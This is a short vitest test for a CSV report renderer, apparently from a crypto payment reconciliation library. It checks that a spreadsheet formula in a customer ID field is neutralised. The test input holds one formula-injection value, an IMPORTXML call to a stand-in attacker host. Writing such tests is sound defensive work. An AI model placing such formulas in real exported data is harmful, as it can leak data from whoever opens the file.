import { expect, it } from "vitest";
import { renderCsvReport, type ReconciliationReportRow } from "../src/index.js";

it("renders stable columns and neutralizes spreadsheet formulas", () => {
  const rows: ReconciliationReportRow[] = [
    {
      invoiceId: "inv-001",
      customerId: '=IMPORTXML("https://attacker.invalid")',
      status: "matched",
      expectedMint: "USDC-mint",
      amountBaseUnits: "12500000",
      eventId: "event-001",
      ruleCode: "exact_match",
    },
  ];

  expect(renderCsvReport(rows)).toBe(
    "invoice_id,customer_id,status,expected_mint,amount_base_units,event_id,rule_code\n" +
      'inv-001,"\'=IMPORTXML(""https://attacker.invalid"")",matched,USDC-mint,12500000,event-001,exact_match\n',
  );
});
